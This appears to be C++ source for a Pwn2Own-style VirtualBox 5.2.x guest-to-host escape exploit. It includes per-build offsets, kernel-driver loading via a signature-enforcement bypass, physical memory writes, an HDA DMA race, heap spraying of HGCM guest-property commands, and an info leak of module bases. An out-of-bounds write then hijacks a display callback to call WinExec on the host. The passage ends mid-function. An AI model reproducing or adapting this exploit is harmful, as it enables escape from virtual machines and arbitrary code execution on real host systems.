// pwn2ownuser.cpp : Defines the entry point for the console application.
//


#include "stdafx.h"
#include<windows.h>
#include<cstdint>
#include<iostream>
#include <stdlib.h>  
#include "libfwexpl.h"
#include "vmm.h"
#include "common.h"
#include "debug.h"
#include "libdsebypass.h"
#include "service.h"


// CONFIG

#if 0  // debug build 5.2.6
#define DEBUGBUILD 1
const uint64_t offset_VBoxC_leak = 0x382ab0;
const uint64_t offset_VBoxC_invalidateAndUpdateEMT = 0xeb310;
#elif 0 // release build 5.2.6
#define DEBUGBUILD 0
const uint64_t offset_VBoxC_leak = 0x195970;
const uint64_t offset_VBoxC_invalidateAndUpdateEMT = 0x84130;
const uint64_t offset_VBoxC_imp_DisableThreadLibraryCalls = 0x1670a0;
#elif 0 // release build 5.2.8
#define DEBUGBUILD 0
const uint64_t offset_VBoxC_leak = 0x195960;
const uint64_t offset_VBoxC_invalidateAndUpdateEMT = 0x84840;
const uint64_t offset_VBoxC_imp_DisableThreadLibraryCalls = 0x1670a0;
#elif 0  // debug build 5.2.8
#define DEBUGBUILD 1
const uint64_t offset_VBoxC_leak = 0x382da0;
const uint64_t offset_VBoxC_invalidateAndUpdateEMT = 0xeb700;
const uint64_t offset_VBoxC_imp_DisableThreadLibraryCalls = 0x2e2138;
#elif 1 // Oracle release build 5.2.8
#define DEBUGBUILD 0
const uint64_t offset_VBoxC_leak = 0x215bf0;
const uint64_t offset_VBoxC_invalidateAndUpdateEMT = 0x8aff0;
const uint64_t offset_VBoxC_imp_DisableThreadLibraryCalls = 0x1E60A8;
#endif

const uint64_t offset_k32_DisableThreadLibraryCalls = 0x11220;
const uint64_t offset_k32_WinExec = 0x5e660;

const int initial_spray = 200;
const int spray_per_try = 10;
// END CONFIG


#define assert(x) do{if(!(x)) {fprintf(stderr, "Assertion failed: %s at %s:%d", #x, __FILE__, __LINE__);exit(1);}}while(0)

using namespace std;

void die(const char* s) {
	fprintf(stderr, "Error: %s\n", s);
	exit(1);
}

void load_driver(const char* filename, char* name) {
	char szDestPath[MAX_PATH];
	PVOID Data = NULL;
	DWORD dwDataSize = 0;

	GetSystemDirectory(szDestPath, sizeof(szDestPath));
	lstrcat(szDestPath, "\\drivers\\");
	lstrcat(szDestPath, filename);

	// copy driver to the system directory
	if (!DeleteFileA(szDestPath)) {
		DbgMsg(__FILE__, __LINE__, __FUNCTION__ "() ERROR: Can't delete %s from system32\\drivers\n", filename);
	}

	if (!CopyFile(filename, szDestPath, FALSE))
	{
		DbgMsg(__FILE__, __LINE__, __FUNCTION__ "() ERROR: Can't copy %s to system32\\drivers\n", filename);
	}

	// start service
	if (!DrvServiceStart(name, szDestPath, NULL))
	{
		DbgMsg(__FILE__, __LINE__, __FUNCTION__ "() ERROR: Can't load driver using system service\n");
		return;
	}
}

//typedef void (f_DirectIO_Init*)();
//typedef void (f_DirectIO_WritePort*)(uint32_t a, uint32_t b, uint32_t c);

uint64_t request_buf_phys;
uint64_t hda_buf_phys, hda_buf_virt;
uint8_t request_buf[0x10000];

#define HDA_CORBCTL_DMA (1ull<<1)

uint64_t hda_base = 0xf0804000;
void write_hda32(uint64_t offset, uint32_t value) {
	assert(uefi_expl_phys_mem_write(hda_base + offset, 4, (unsigned char*)&value, U32));
}
void write_hda16(uint64_t offset, uint16_t value) {
	assert(uefi_expl_phys_mem_write(hda_base + offset, 2, (unsigned char*)&value, U16));
}
void write_hda8(uint64_t offset, uint8_t value) {
	assert(uefi_expl_phys_mem_write(hda_base + offset, 2, (unsigned char*)&value, U8));
}

static void set_corb_base(uint64_t addr) {
	write_hda32(0x40, addr & 0xffffffffull);
	write_hda32(0x44, (addr >> 32) & 0xffffffffull);
}

static void set_rirb_base(uint64_t addr) {
	write_hda32(0x50, addr & 0xffffffffull);
	write_hda32(0x54, (addr >> 32) & 0xffffffffull);
}

static void set_corb_size(uint8_t sz) {
	write_hda8(0x4e, sz);
}

static void set_corb_ctl(uint8_t val) {
	write_hda8(0x4c, val);
}

static void set_corb_wp(uint16_t val) {
	write_hda16(0x48, val);
}

static void set_corb_rp(uint16_t val) {
	write_hda16(0x4a, val);
}

void write_req() {
	assert(uefi_expl_phys_mem_write(request_buf_phys, 0x1000, request_buf, U32));
}

void read_req() {
	assert(uefi_expl_phys_mem_read(request_buf_phys, 0x1000, request_buf));
}


typedef void(*f_DirectIO_Init)();
typedef void(*f_DirectIO_WritePort)(uint64_t a, uint64_t b, uint64_t c);
f_DirectIO_Init DirectIO_Init;
f_DirectIO_WritePort DirectIO_WritePort;

void init_directio() {
	HMODULE lib = LoadLibraryA("DirectIOLibx64.dll");
	assert(lib);
	DirectIO_Init = (f_DirectIO_Init)GetProcAddress(lib, "DirectIO_Init");
	DirectIO_WritePort = (f_DirectIO_WritePort)GetProcAddress(lib, "DirectIO_WritePort");
	assert(DirectIO_Init);
	assert(DirectIO_WritePort);
	DirectIO_Init();
}

uint32_t dispatch_offset = 0;
void set_dispatch_offset(uint32_t offset) {
	dispatch_offset = offset;
}
void* reqbuf() {
	return request_buf + dispatch_offset;
}

void vmm_dispatch() {
	write_req();
	assert(uefi_expl_port_write(0xd020, U32, request_buf_phys+ dispatch_offset));
	//DirectIO_WritePort(request_buf_phys+ dispatch_offset, 0xd020, 3);
	read_req();
}

void hgcm_dispatch(int error_is_ok) {
	vmm_dispatch();
	VMMDevHGCMRequestHeader* req = (VMMDevHGCMRequestHeader*)reqbuf();
	int32_t rc = req->header.rc;
	if (rc == VINF_HGCM_ASYNC_EXECUTE) {
		while (!(req->fu32Flags & VBOX_HGCM_REQ_DONE)) {
			read_req();
		}
	}
	else {
		assert(error_is_ok);
	}
	/*assert(req->result == 0);*/
}

void guest_info() {
	VMMDevReportGuestInfo* req = (VMMDevReportGuestInfo*)reqbuf();
	req->header.size = sizeof(*req);
	req->header.version = VMMDEV_REQUEST_HEADER_VERSION;
	req->header.requestType = VMMDevReq_ReportGuestInfo;
	req->header.rc = 0;
	req->guestInfo.osType = VBOXOSTYPE_Win10_x64;
	req->guestInfo.interfaceVersion = VMMDEV_REQUEST_HEADER_VERSION;
	vmm_dispatch();
}

uint32_t hgcm_connect(const char* svc) {
	VMMDevHGCMConnect * req = (VMMDevHGCMConnect*)reqbuf();
	req->header.header.size = sizeof(*req);
	req->header.header.version = VMMDEV_REQUEST_HEADER_VERSION;
	req->header.header.requestType = VMMDevReq_HGCMConnect;
	req->header.header.rc = 0;
	req->header.fu32Flags = 0;
	req->header.result = 0;
	req->loc.type = VMMDevHGCMLoc_LocalHost_Existing;
	strcpy((char*)req->loc.u.host.achName, svc);
	req->u32ClientID = 1337;
	hgcm_dispatch(0);
	return req->u32ClientID;
}

void hgcm_call(uint32_t client, uint32_t func, uint32_t cParms,
	HGCMFunctionParameter32* params, int waitforresult)
{
	VMMDevHGCMCall32 * req = (VMMDevHGCMCall32*)reqbuf();
	req->header.header.size = sizeof(*req) + cParms * sizeof(params[0]);
	/*req->header.header.size = 0x408;*/
	req->header.header.version = VMMDEV_REQUEST_HEADER_VERSION;
	req->header.header.requestType = VMMDevReq_HGCMCall32;
	req->header.header.rc = 0;
	req->header.fu32Flags = 0;
	req->header.result = 0;
	req->u32ClientID = client;
	req->u32Function = func;
	req->cParms = cParms;
	assert(sizeof(VMMDevHGCMCall32) == 0x2c);
	assert(sizeof(HGCMFunctionParameter32) == 12);
	memcpy((void*)req->params, params, sizeof(params[0]) * cParms);
	if (waitforresult)
		hgcm_dispatch(0);
	else
		vmm_dispatch();
}

uintptr_t alloc_base = 0x40000000;
void* alloc32(size_t size) {
	//printf("alloc base=%p\n", alloc_base);
	size = (size + 0xfff) & ~0xfff;
	void* res = VirtualAlloc(
		(void*)alloc_base, size,
		MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!res)
		die("mmap alloc32");
	assert((uintptr_t)res == alloc_base);
	assert((uint64_t)res == (uint32_t)res);
	alloc_base += 0x10000;
	return res;
}

void set_prop(uint32_t client,
	char* key, uint32_t key_sz, char* val, uint32_t val_sz) {
	HGCMFunctionParameter32 params[2];
	params[0].type = VMMDevHGCMParmType_LinAddr_In;
	params[0].u.Pointer.u.linearAddr = (RTGCPTR32)key;
	params[0].u.Pointer.size = key_sz;
	params[1].type = VMMDevHGCMParmType_LinAddr_In;
	params[1].u.Pointer.u.linearAddr = (RTGCPTR32)val;
	params[1].u.Pointer.size = val_sz;
	hgcm_call(client, SET_PROP, 2, params, 1);
}

void get_prop(uint32_t client, char* key, uint32_t key_sz, char* out, uint32_t out_sz) {
	HGCMFunctionParameter32 params[4];
	params[0].type = VMMDevHGCMParmType_LinAddr_In;
	params[0].u.Pointer.u.linearAddr = (RTGCPTR32)key;
	params[0].u.Pointer.size = key_sz;
	params[1].type = VMMDevHGCMParmType_LinAddr_Out;
	params[1].u.Pointer.u.linearAddr = (RTGCPTR32)out;
	params[1].u.Pointer.size = 0x1000;
	params[2].type = VMMDevHGCMParmType_64bit;
	params[3].type = VMMDevHGCMParmType_64bit;
	hgcm_call(client, GET_PROP, 4, params, 1);
}

void del_prop(uint32_t client, char* key, uint32_t key_sz) {
	HGCMFunctionParameter32 params[2];
	params[0].type = VMMDevHGCMParmType_LinAddr_In;
	params[0].u.Pointer.u.linearAddr = (RTGCPTR32)key;
	params[0].u.Pointer.size = key_sz;
	hgcm_call(client, DEL_PROP, 1, params, 1);
}

void wait_prop(uint32_t client, char* pattern, int pattern_size, char* out, int outsize) {
	assert((uint64_t)pattern < 1ll << 32);
	assert((uint64_t)out < 1ll << 32);

	HGCMFunctionParameter32 params[4];
	params[0].type = VMMDevHGCMParmType_LinAddr_In;
	params[0].u.Pointer.u.linearAddr = (RTGCPTR32)pattern;
	params[0].u.Pointer.size = pattern_size;
	params[1].type = VMMDevHGCMParmType_64bit;
	params[2].type = VMMDevHGCMParmType_LinAddr_Out;
	params[2].u.Pointer.u.linearAddr = (RTGCPTR32)out;
	params[2].u.Pointer.size = outsize;
	params[3].type = VMMDevHGCMParmType_32bit;
	hgcm_call(client, GET_NOTIFICATION, 4, params, 0);
}

volatile uint32_t hda_size1, hda_size2;
void set_offset(uint32_t offset) {
	hda_size2 = offset - 0x870;
}
void set_safe_offset() {
	hda_size2 = hda_size1;
}

unsigned char hda_payload[0x400];

void write_hda_payload() {
	assert(uefi_expl_phys_mem_write(hda_buf_phys, sizeof(HGCMFunctionParameter32)*4, hda_payload, U32));
	set_corb_ctl(HDA_CORBCTL_DMA);
}

void mangle_hda_buf() {
	memset(hda_payload, 'a', 0x40);
	write_hda_payload();
}

void init_hda_payload(int id) {
	HGCMFunctionParameter32* p = (HGCMFunctionParameter32*)hda_payload;

	size_t alloc_size = 0x10000;
	size_t offset = 0xffffffff; //-0x14de2a40;
	size_t payload_size = 0x20;
	RTGCPTR32 payload_loc = 0xb0000000;


	hda_size1 = alloc_size - 0x871 - payload_size;
	hda_size2 = hda_size1; // harmless size

	// 83  - Some identifier
	p[0].type = VMMDevHGCMParmType_64bit;
	p[0].u.value64 = 0xdeadbeefdead0000ull + id;
	// 84  - Index shifter (we will flip the size here)
	p[1].type = VMMDevHGCMParmType_PageList;
	p[1].u.PageList.size = hda_size1; // dummy value
	p[1].u.PageList.offset = 0x30;
	// 85  - Payload.
	p[2].type = VMMDevHGCMParmType_LinAddr_In;
	p[2].u.Pointer.size = payload_size;
	p[2].u.Pointer.u.linearAddr = payload_loc;
	// 86  - Canceler. This will work in the first pass, but not in the second,
	//       so we don't run into the other heap overflow.
	p[3].type = VMMDevHGCMParmType_LinAddr_In;
	p[3].u.Pointer.size = 1;
	p[3].u.Pointer.u.linearAddr = 0x41414141;

	write_hda_payload();
}

#define LEAK_MAGIC 0xdeadbeefdeadbeefull

static void* buf32[5];
void* get_temp_buf32(int idx, uint32_t size) {
	if (!buf32[idx]) {
		buf32[idx] = alloc32(0x10000);
	}
	if (size <= 0x10000) {
		return buf32[idx];
	} else {
		return alloc32(size);
	}
}

int leak(uint32_t client, size_t reqsize, size_t alloc,
		size_t overread, char* out, int wait_for_free=1) {
	assert(alloc >= 0x60 && overread >= 8);
	size_t argsize = alloc - 0x60;
	char* buf = (char*)get_temp_buf32(0, argsize + overread);
	memset(buf, 'A', argsize + overread);
	buf[argsize - 1] = 0; // make it a valid string
	HGCMFunctionParameter32 params[2];
	params[0].type = VMMDevHGCMParmType_LinAddr;
	params[0].u.Pointer.u.linearAddr = (RTGCPTR32)buf;
	params[0].u.Pointer.size = argsize;

	volatile uint64_t* magic = (uint64_t*)(buf + argsize);
	*magic = LEAK_MAGIC;

	size_t cParms = 1;
	VMMDevHGCMCall32 * req = (VMMDevHGCMCall32*)reqbuf();
	size_t minreqsize = sizeof(*req) + cParms * sizeof(params[0]);
	if (minreqsize > reqsize)
		reqsize = minreqsize;
	req->header.header.size = reqsize;
	req->header.header.version = VMMDEV_REQUEST_HEADER_VERSION;
	req->header.header.requestType = VMMDevReq_HGCMCall32;
	req->header.header.rc = 0;
	req->header.fu32Flags = 0;
	req->header.result = 0;
	req->u32ClientID = client;
	req->u32Function = DEL_PROP;
	req->cParms = cParms;
	assert(sizeof(VMMDevHGCMCall32) == 0x2c);
	assert(sizeof(HGCMFunctionParameter32) == 12);
	memcpy((void*)req->params, params, sizeof(params[0]) * cParms);

	uint32_t new_size = argsize + overread;
	uint64_t offset = (char*)&req->params[0].u.Pointer.size - (char*)req;

	write_req();
	vmm_dispatch();
	//printf("offset=0x%x\n", offset);
	//return 1;
	assert(uefi_expl_phys_mem_write(request_buf_phys + dispatch_offset + offset, 4, (unsigned char*)&new_size, U32));
	read_req();
	int32_t rc = req->header.header.rc;
	if (rc == VINF_HGCM_ASYNC_EXECUTE) {
		while (!(req->header.fu32Flags & VBOX_HGCM_REQ_DONE)) {
			read_req();
		}
	}
	else {
		assert(0);
	}
	if (*magic != LEAK_MAGIC) {
		memcpy(out, buf + argsize, overread);
		return 1;
	}
	// make sure it is really freed, because the result is written 
	// before freeing the command buffe
	if (wait_for_free)
		Sleep(1);
	return 0;
}


char spray_prefix[10];
bool spray_prefix_initialized = 0;

void spray_cmds(uint32_t client, int from, int to, int size) {
	if (!spray_prefix_initialized) {
		spray_prefix_initialized = 1;
		unsigned int x;
		rand_s(&x);
		x %= 100000;
		sprintf(spray_prefix, "spray%u", x);
		printf("Spray prefix is %s\n", spray_prefix);
	}
	assert(size >= 0xa9);
	int patsize = size - 1 - 0xa8;
	assert(patsize > 20);
	char* pattern = (char*)get_temp_buf32(0, patsize);
	memset(pattern, 'a', patsize); // touch to page in

	char* out = (char*)get_temp_buf32(1, 1);
	out[0] = 'a'; // touch to page in

	for (int i = from; i < to; ++i) {
		sprintf(pattern, "%s-%d", spray_prefix, i);
		/*printf("Spraying pattern %s\n", pattern);*/
		wait_prop(client, pattern, patsize, out, 1);
	}
}

void place_data(uint32_t client, char* data, int data_size, int alloc_size) {
	assert(alloc_size >= 0xa9);
	int patternsize = alloc_size - 1 - 0xa8;
	assert(patternsize > data_size + 0x100-0xa8);
	char* pattern = (char*)get_temp_buf32(0, patternsize);
	memset(pattern, 'a', patternsize); // touch to page in
	sprintf(pattern, "x%d", rand());
	memcpy(pattern+0x100-0xa8, data, data_size);

	char* out = (char*)get_temp_buf32(1, 1);
	out[0] = 'a'; // touch to page in

	wait_prop(client, pattern, patternsize, out, 1);
}

void free_cmd(uint32_t client, int i) {
	char* key = (char*)get_temp_buf32(0, 10);
	char* val = (char*)get_temp_buf32(1, 10);
	sprintf(key, "%s-%d", spray_prefix, i);
	sprintf(val, "x", i);
	set_prop(client, key, strlen(key) + 1, val, strlen(val) + 1);
	del_prop(client, key, strlen(key) + 1);
}

void leak_retry(uint32_t client, size_t reqsize, size_t alloc,
	size_t overread, char* out, int wait_for_free=1) {
	int res = 0;
	int tries = 0;
	while (!res) {
		++tries;
		res = leak(client, reqsize, alloc, overread, out, wait_for_free);
	}
}

void set_affinity(int i) {
	if (!SetThreadAffinityMask(GetCurrentThread(), 1 << i)) {
		die("Could not set thread affinity\n");
	}
}

void init() {
	uint64_t dummy;

	assert(uefi_expl_mem_alloc(0x10000, &dummy, &request_buf_phys));
	printf("Request buf @ 0x%p\n", request_buf_phys);
	//init_directio();
	load_driver("pwn2own.sys", "pwn2own");
}

void hda_init() {
	assert(uefi_expl_mem_alloc(0x1000, &hda_buf_virt, &hda_buf_phys));
	printf("HDA buf @ 0x%p\n", hda_buf_phys);

	set_corb_base(hda_buf_phys);
	set_rirb_base(hda_buf_phys + 0x800);
}

void realloc_hda() {
	set_corb_ctl(0);
	set_corb_size(1);
	set_corb_size(2);

	set_corb_rp(1 << 15);
	set_corb_rp(0);
	set_corb_wp(0);
}

HANDLE dev_connect() {
	HANDLE h = CreateFileA("\\\\.\\VBoxPwn", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	if (h == INVALID_HANDLE_VALUE)
		die("Could not open device");
	return h;
}

void dev_ioctl(int code, void* inbuf, DWORD inbufsize, void* outbuf, DWORD* outbufsize) {
	HANDLE h = dev_connect();
	if (!DeviceIoControl(h, code, inbuf, inbufsize, outbuf, outbufsize ? *outbufsize : 0, outbufsize, NULL))
		die("IoControl");
}

ULONG64 flip() {
	HGCMFunctionParameter32* p = (HGCMFunctionParameter32*)hda_payload;
	uint32_t offset = (char*)&p[1].u.PageList.size - (char*)p;
	//printf("flip_offset=%x\n", offset);
	printf("flipping...\n");
	struct {
		uint32_t* addr;
		volatile uint32_t* val1;
		volatile uint32_t* val2;
	} req;
	req.addr = (uint32_t*)(hda_buf_virt + offset);
	req.val1 = &hda_size1;
	req.val2 = &hda_size2;
	ULONG64 out;
	DWORD outsz = 8;
	dev_ioctl(0x23CCC4, &req, sizeof(req), &out, &outsz);
	return out;
}

DWORD WINAPI flipper(LPVOID arg) {
	set_affinity(1);
	printf("Started flipper on CPU %d\n", GetCurrentProcessorNumber());
	for (;;) {
		flip();
	}
	return 0;
}

int cmd_hda(int argc, char** argv) {
	set_affinity(0);
	printf("Main thread running on CPU %d\n", GetCurrentProcessorNumber());
	hda_init();
	realloc_hda();
	init_hda_payload(1);
	//flipper(0);
	return 0;
}

int cmd_hda2(int argc, char** argv) {
	hda_init();
	realloc_hda();
	init_hda_payload(1);
	flipper(0);
	return 0;
}


uint32_t client;
int hda_id;
void* payload;
int spray_offset = 0;

uint64_t VBoxC;
uint64_t kernel32;

void leak_modules() {
	uint64_t leakbuf[10];
	printf("Leaking VBoxC base...\n");
	for (;;) {
		leak_retry(client, 0, 152, 4 * 8, (char*)leakbuf);
		printf("%p\n", leakbuf[1]);
		if ((leakbuf[1] >> 40) == 0x7f 
				&& (leakbuf[1] & 0xffff) == (offset_VBoxC_leak & 0xffff)
				) 
		{
			VBoxC = leakbuf[1] - offset_VBoxC_leak;
			break;
		}
	}
	printf("VBoxC @ %p\n", VBoxC);
}

void find_good_hda() {
	int found = 0;
	int hits = 0, maxi = 0;
	const int tests = 200;
	float threshold = 0.1;
	uint64_t leakbuf[100];

	for (hda_id = 1; hda_id < 1200; ++hda_id) {
		if (hda_id % 256 == 0) {
			printf("Scaling down threshold. Good luck.\n");
			threshold /= 2;
		}
		realloc_hda();
		init_hda_payload(hda_id);
		hits = 0;
		for (int j = 0; j < tests; ++j) {
			int res = 0;
			while (!res)
				res = leak(client, 0, 0x408, 8 * 2, (char*)&leakbuf, 0);
			/*for (int k = 0; k < 2; ++k)*/
			/*printf("  %llx\n", leakbuf[k]);*/
			/*printf("=============\n");*/
			if (leakbuf[1] == 0xdead000000000002ull + ((uint64_t)hda_id << 32)) {
				hits++;
			}
		}
		if (hits >= threshold * tests) {
			found = 1;
			break;
		}
		if (hits > maxi)
			maxi = hits;
		if (hda_id % 20 == 0)
			printf("HDA ID %d not good with %d/%d hits (max so far: %d)\n", hda_id, hits, tests, maxi);
		mangle_hda_buf();
	}
	if (!found) {
		fprintf(stderr, "Could not find HDA buffer\n");
		exit(1);
	}
	printf("Using HDA ID %d, %d/%d hits\n", hda_id, hits, tests);
}

void alloc_payload() {
	void* payload_location = (void*)0xb0000000;
	payload = VirtualAlloc(
		payload_location, 0x1000,
		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (payload != payload_location) {
		die("Could not allocate virtual memory at 0xb0000000");
	}
}

void start_flipper() {
	DWORD flipper_thread_id;
	HANDLE flipper_thread = CreateThread(0, 0, flipper, 0, 0, &flipper_thread_id);
	if (!flipper_thread) {
		die("CreateThread");
	}
}

void trigger_oob(int rounds, char* overwrite, uint64_t master, uint64_t victim) {
	set_offset(victim - master);

	uint64_t leakbuf[100];
	for (int round = 1; round <= rounds; ++round) {
		if (round % 100 == 0)
			printf("  Round %d\n", round);

		leak_retry(client, 0, 0x10000, 8 * 8, (char*)&leakbuf);
		if (master != (leakbuf[7] - 0x10058)) {
			fprintf(stderr, "Failed prediction!\n");
			break;
		}

		HGCMFunctionParameter32 params[100];
		for (int i = 0; i < 83; ++i) {
			params[i].type = VMMDevHGCMParmType_64bit;
			params[i].u.value32 = 0x1337 + i;
		}

		// We fake a PageListInfo struct at offset 0x30. aParams will have two
		// random addresses, but that's fine. Any physical address is valid.
		HGCMPageListInfo* page_list = (HGCMPageListInfo*)&params[0].u.value64;
		page_list->flags = VBOX_HGCM_F_PARM_DIRECTION_TO_HOST;
		page_list->offFirstPage = 0;
		page_list->cPages = 2;

		VMMDevHGCMCall32 * req = (VMMDevHGCMCall32*)reqbuf();
		req->header.header.size = 0x408;
		req->header.header.version = VMMDEV_REQUEST_HEADER_VERSION;
		req->header.header.requestType = VMMDevReq_HGCMCall32;
		req->header.header.rc = 0;
		req->header.fu32Flags = 0;
		req->header.result = 0;
		req->u32ClientID = client;
		req->u32Function = SET_PROP;
		req->cParms = 87;
		assert(sizeof(VMMDevHGCMCall32) == 0x2c);
		assert(sizeof(HGCMFunctionParameter32) == 12);
		memcpy((void*)req->params, params, sizeof(params[0]) * req->cParms);

		memcpy(payload, overwrite, 0x20);
		hgcm_dispatch(1);
	}
	set_safe_offset();
	Sleep(10);
}

uint64_t read_mem(uint64_t addr) {
	uint64_t leakbuf[100];

	uint64_t loc_targetcmd, loc_master;
	uint64_t loc_payload0;
	int targetcmd_id;
	VBOXHGCMSVCPARM parm;
	parm.type = VBOX_HGCM_SVC_PARM_PTR;
	parm.u.pointer.size = 0x1000;
	uint64_t leak_addr = addr;
	printf("Leaking from %p\n", leak_addr);
	parm.u.pointer.addr = (void*)leak_addr; // what to leak
	for (;;) {
		spray_cmds(client, spray_offset, spray_offset + initial_spray, 0x10000);
		spray_offset += initial_spray;

		free_cmd(client, spray_offset - 10);
		leak_retry(client, 0, 0x10000, 8 * 8, (char*)&leakbuf);
		loc_payload0 = leakbuf[7] - 0x10058 + 0x100;
		if (loc_payload0 > (1ull << 48)) {
			printf("bad condition (0), retry\n");
			continue;
		}
		place_data(client, (char*)&parm, 0x100, 0x10000);
		printf("payload0 @ %p\n", loc_payload0);

		free_cmd(client, spray_offset - 4);
		leak_retry(client, 0, 0x10000, 8 * 8, (char*)&leakbuf);
		//Sleep(10);
		loc_targetcmd = leakbuf[7] - 0x10058;
		targetcmd_id = spray_offset;
		printf("target pCmd (id %d) is at %p\n", targetcmd_id, loc_targetcmd);
		if (loc_targetcmd > (1ll << 48)) {
			printf("bad condition (3), retry\n");
			continue;
		}
		set_dispatch_offset(0x800);
		spray_cmds(client, spray_offset, spray_offset + 1, 0x10000);
		set_dispatch_offset(0);
		spray_offset++;

		free_cmd(client, spray_offset - 15);
		leak_retry(client, 0, 0x10000, 8 * 8, (char*)&leakbuf);
		//Sleep(10);
		loc_master = leakbuf[7] - 0x10058;
		printf("master pCmd is at %p\n", loc_master);
		if (loc_master + 0x20000 > loc_targetcmd) {
			printf("bad condition (1), retry\n");
			continue;
		}

		// verify master location
		leak_retry(client, 0, 0x10000, 8 * 8, (char*)&leakbuf);
		if ((leakbuf[7] - 0x10058) != loc_master) {
			printf("bad condition (2), retry\n");
			continue;
		}
		printf("Good condition, taking it\n");
		break;
	}

	{
		uint64_t marker = LEAK_MAGIC;
		assert(uefi_expl_phys_mem_write(request_buf_phys + 0x2000, 8, (unsigned char*)&marker, U32));
	}

	// touch
	struct {
		uint64_t paHostParams;
		uint32_t cHostParams;
		uint32_t cLinPtrs;
		uint32_t cLinPtrPages;
		uint64_t paLinPtrs;
	} fake_pcmd;
	fake_pcmd.paHostParams = loc_payload0;
	fake_pcmd.cHostParams = 1;
	fake_pcmd.cLinPtrs = 0;
	fake_pcmd.cLinPtrPages = 0;
	fake_pcmd.paLinPtrs = 0;

	const uint32_t page_list_offset = 44 + 12;
	VMMDevHGCMCall32* fake_req = (VMMDevHGCMCall32*)(request_buf + 0x800);
	fake_req->header.header.size = 0x400;
	fake_req->header.header.requestType = VMMDevReq_HGCMCall32;
	fake_req->cParms = 1;
	fake_req->params[0].type = VMMDevHGCMParmType_PageList;
	fake_req->params[0].u.PageList.size = 0x1000;
	fake_req->params[0].u.PageList.offset = page_list_offset;

	HGCMPageListInfo* page_list_ = (HGCMPageListInfo*)(request_buf + 0x800 + page_list_offset);
	page_list_->flags = VBOX_HGCM_F_PARM_DIRECTION_FROM_HOST;
	page_list_->offFirstPage = 0;
	page_list_->cPages = 1;
	page_list_->aPages[0] = request_buf_phys + 0x2000;
	//write_req();  // will be done by hgcm_dispatch anyways

	trigger_oob(300, (char*)&fake_pcmd, loc_master, loc_targetcmd + 0x28);

	free_cmd(client, targetcmd_id);

	uint64_t res;
	assert(uefi_expl_phys_mem_read(request_buf_phys + 0x2000, 8, (unsigned char*)&res));
	if (res == LEAK_MAGIC) {
		fprintf(stderr, "Leak failed, retrying\n");
		return read_mem(addr);
	}
	return res;
}

void pwn() {
	printf("A\n");
	spray_cmds(client, spray_offset, spray_offset + initial_spray, 0x10000);
	spray_offset += initial_spray;
	printf("B\n");

	uint64_t leakbuf[100];
	free_cmd(client, spray_offset - 10);
	leak_retry(client, 0, 0x10000, 8 * 8, (char*)&leakbuf);
	uint64_t loc_payload1 = leakbuf[7] - 0x10058 + 0x100;
	if (loc_payload1 > (1ull << 48)) {
		fprintf(stderr, "failed allocating payload\n");
		return;
	}
	printf("C\n");

	char context[0x400] = { 0 };

	// Display
	*(uint64_t*)(context + 0) = VBoxC + offset_VBoxC_invalidateAndUpdateEMT;
	//*(uint64_t*)(context + 0) = 0x414141414141;
	*(uint64_t*)(context + 0xe0) = loc_payload1 + 0x200; // mpDrv
	*(uint64_t*)(context + 0xe8) = 1; // mcMonitors
	*(uint8_t*)(context + 0x100 + (DEBUGBUILD ? 0xb9 : 0x89)) = 0; // maFramebuffers[0].fVBVAEnabled

																   // mpDrv
	*(uint64_t*)(context + 0x200 + 0x10) = loc_payload1 + 0x300; //pUpPort

																 // pUpPort
																 //*(uint64_t*)(context + 0x300 + 0) = 0x424242424242; // <- first arg
	strcpy(context + 0x300 + 0, "calc");
	*(uint64_t*)(context + 0x300 + 8) = kernel32 + offset_k32_WinExec; // pfnUpdateDisplayAll
	printf("D\n");

	place_data(client, (char*)&context, 0x400, 0x10000);
	printf("payload1 @ %p\n", loc_payload1);

	free_cmd(client, spray_offset - 4);
	//Sleep(10);
	leak_retry(client, 0, 0x10000, 8 * 8, (char*)&leakbuf);
	uint64_t prediction = leakbuf[7] - 0x10058;
	//Sleep(10);
	leak_retry(client, 0, 0x10000, 8 * 8, (char*)&leakbuf);
	//Sleep(10);
	if ((leakbuf[7] - 0x10058) != prediction) {
		fprintf(stderr, "fail (5), retrying\n");
		return;
	}
	printf("prediction = 0x%p\n", prediction);
	//exit(0);

	char* fakemsg = (char*)malloc(0x100);

	const int msg_spray_start = spray_offset + 1000;
	const int msg_spray_step = 200;
	int msg_spray_offset = msg_spray_start;
	uint64_t target;
	int found = 0;
	while (!found) {
		spray_cmds(client,
			msg_spray_offset, msg_spray_offset + msg_spray_step, 0xc0);
		msg_spray_offset += msg_spray_step;
		for (int i = 0; i < 50; ++i) {
			leak_retry(client, 0, 0x98, 20 * 8, (char*)&leakbuf, 0);
			char* msg = (char*)leakbuf + 8;
			if (*(uint64_t*)(msg + 0x8) == 0x200000001ull
				&& (*(uint32_t*)(msg + 0x80) == client)
				&& (*(uint32_t*)(msg + 0x84) == GET_NOTIFICATION)
				&& (*(uint32_t*)(msg + 0x88) == 4) // cParms
				)
			{
				target = *(uint64_t*)(msg + 0x30);
				/*printf("found one at 0x%p (prediction=%p)\n", target, prediction);*/
				if (target > prediction + 0x20000) {
					printf("  yes! 0x%p -> 0x%p\n", prediction, target);
					memcpy(fakemsg, msg, 0x100);
					found = 1;
					break;
				}
			}
		}
	}

	// pivot gadget
	*(uint64_t*)(fakemsg + 0x78) = loc_payload1;

	// spray some more in case chunks were freed by some other component in the meantime
	spray_cmds(client, spray_offset, spray_offset + initial_spray, 0x10000);
	spray_offset += initial_spray;

	free_cmd(client, spray_offset - initial_spray - 7);
	//Sleep(10);
	leak_retry(client, 0, 0x10000, 8 * 8, (char*)&leakbuf);
	//Sleep(10);
	prediction = leakbuf[7] - 0x10058;
	printf("new prediction = 0x%p\n", prediction);

	leak_retry(client, 0, 0x10000, 8 * 8, (char*)&leakbuf);
	//Sleep(10);
	if ((leakbuf[7] - 0x10058) != prediction) {
		fprintf(stderr, "fail (6), retrying\n");
		return;
	}

	if (prediction + 0x20000 > target) {
		fprintf(stderr, "fail (7), retrying\n");
	}

	trigger_oob(500, fakemsg + 0x78, prediction, target + 0x78);

	printf("Triggering\n");
	Sleep(100);
	for (int i = msg_spray_start; i < msg_spray_offset; ++i)
		free_cmd(client, i);
}

int cmd_sploit1(int argc, char** argv) {
	set_affinity(0);
	printf("Main thread running on CPU %d\n", GetCurrentProcessorNumber());

	client = hgcm_connect("VBoxGuestPropSvc");

